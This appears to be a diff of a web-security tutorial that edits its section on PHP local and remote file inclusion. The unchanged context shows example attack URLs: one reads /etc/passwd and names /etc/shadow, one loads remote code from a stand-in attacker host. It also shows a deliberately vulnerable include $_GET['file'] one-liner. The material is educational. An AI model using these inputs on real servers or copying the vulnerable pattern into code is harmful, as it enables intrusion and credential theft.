@@ -167,7 +167,7 @@ From that, you can create a very nice phishing attack, like <i>We are sorry, cou
 
 ## File Inclusions/Path Traversals
 
-Next on the list are RFI/LFI and Path Traversals. File Inclusions are mostly found in PHP applications; they are the result of using <code>include()</code> function incorrectly. People sometimes can't make the difference between those two similar vulnerabilities (LFI and RFI). That's okay, because here I'll try to explain it with some easy examples. 
+Next on the list are RFI/LFI and Path Traversals. File Inclusions are mostly found in PHP applications; they are the result of using <code>include()</code> and <code>require()</code> function incorrectly. People sometimes can't make the difference between those two similar vulnerabilities (LFI and RFI). That's okay, because here I'll try to explain it with some easy examples. 
 The easiest way to explain it:<br>
 When an attacker is exploiting RFI, he uses a remote file, while on the other side, LFI uses local files when they are attacking servers; even the name of the vulnerability tells you that. While exploiting LFI you can get response from the local system files, for example <code>/etc/passwd</code> or <code>/etc/shadow</code>.<br>
 <code>https://localhost/app.php?file=/etc/passwd</code>
@@ -176,4 +176,5 @@ On the other hand, while exploiting RFI you can upload files from a remote serve
 Example for RFI: <code>https://localhost/app.php?file=http://attackers.website.com/somemaliciousfile</code>. You could execute malicious code from the <code>somemaliciousfile</code> file and use it for malicious intention. <br>
 
 Take this one-liner for example: <code>&lt;?php include $_GET['file']; ?&gt;</code>
+
 
